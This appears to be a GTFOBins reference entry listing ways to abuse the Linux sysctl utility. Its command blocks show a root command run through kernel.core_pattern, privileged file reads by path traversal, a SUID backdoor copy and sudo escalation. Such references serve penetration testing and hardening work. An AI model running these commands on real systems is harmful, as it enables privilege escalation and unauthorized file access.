# GTFOBin: sysctl

## Command

It can be used to break out from restricted environments by running non-interactive system commands.

The command is executed by root in the background when a core dump occurs.

```
COMMAND='/bin/sh -c id>/tmp/id'
sysctl "kernel.core_pattern=|$COMMAND"
sleep 9999 &
kill -QUIT $!
cat /tmp/id
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files.

```
LFILE=file_to_read
/usr/sbin/sysctl -n "/../../$LFILE"
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which sysctl) .

COMMAND='/bin/sh -c id>/tmp/id'
./sysctl "kernel.core_pattern=|$COMMAND"
sleep 9999 &
kill -QUIT $!
cat /tmp/id
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
COMMAND='/bin/sh -c id>/tmp/id'
sudo sysctl "kernel.core_pattern=|$COMMAND"
sleep 9999 &
kill -QUIT $!
cat /tmp/id
```